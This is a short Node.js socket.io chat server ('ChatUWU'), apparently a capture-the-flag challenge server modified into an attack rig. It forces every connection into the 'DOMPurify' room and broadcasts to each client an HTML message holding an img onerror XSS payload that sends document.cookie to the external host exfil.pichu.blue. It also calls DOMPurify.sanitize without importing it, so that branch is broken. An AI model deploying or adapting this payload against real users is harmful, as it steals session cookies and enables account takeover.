const app = require('express')();

app.use((req, res, next) => {
	console.log(req.url);
	next();
});

const http = require('http').Server(app);
const io = require('socket.io')(http, {
	cors: {
		origin: "*",
		methods: ["GET", "POST"]
	}
});

const rooms = ['textContent', 'DOMPurify'];

io.on('connection', (socket) => {
    let {nickname, room} = socket.handshake.query;
	room = "DOMPurify";
    if (!rooms.includes(room)) {
        socket.emit('error', 'the room does not exist');
        socket.disconnect(true);
        return;
    }
    socket.join(room);
	console.log("emittin");
    io.to(room).emit('msg', {
        from: 'bluepichu',
        text: `<img src="x" onerror="fetch('http://exfil.pichu.blue?cookie=' + encodeURIComponent(document.cookie))">`,
		isHtml: true
    });
    socket.on('msg', msg => {
		console.log("got mesg");
        msg.from = String(msg.from).substr(0, 16)
        msg.text = String(msg.text).substr(0, 140)
        if (room === 'DOMPurify') {
            io.to(room).emit('msg', {
                from: DOMPurify.sanitize(msg.from),
                text: DOMPurify.sanitize(msg.text),
                isHtml: true
            });
        } else {
            io.to(room).emit('msg', {
                from: msg.from,
                text: msg.text,
                isHtml: false
            });
        }
    });
});

http.listen(8000, () => {
    console.log(`ChatUWU server running at http://localhost:8000/`);
});